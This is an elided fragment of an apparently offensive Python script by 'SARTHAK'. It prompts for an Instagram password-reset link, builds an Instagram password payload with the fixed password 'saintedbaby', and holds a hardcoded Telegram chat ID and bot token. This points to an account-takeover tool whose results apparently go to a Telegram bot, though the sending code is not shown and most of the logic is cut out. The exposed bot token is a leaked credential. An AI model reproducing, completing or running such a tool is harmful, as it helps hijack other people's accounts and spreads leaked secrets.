...
def banner():
    ...
    ╔════════════════════════════════════════╗
    ║{RED}                                        {CYAN}║
    ║{RED}           S A R T H A K   P Y{CYAN}          ║
    ║{RED}                                        {CYAN}║
    ║{RED}     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{CYAN}      ║
    ║{RED}                                        {CYAN}║
    ║     {RED}DEV{RESET}{CYAN} / @SARTHAK_REDIRECT         ║
    ║     {RED}CHANNEL{RESET}{CYAN} / @sarthakredirect      ║
    ║     {RED}PROGRAMMER{RESET}{CYAN} / SARTHAK            ║
    ║{RED}                                        {CYAN}║
    ╚════════════════════════════════════════╝{RESET}
    """)
...
chat_id = "7453226176"
print("\n")
bot_token = "8200635141:AAGRPg3TSoiZVXUSeQ2gpcyTXG2NuY9QO4g"
...
def generate_device_info():
    ...
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:saintedbaby'
...
def main():
    ...
    banner()
    print("\n")
    reset_link = input("Enter Rest Link :")
    print("\n")
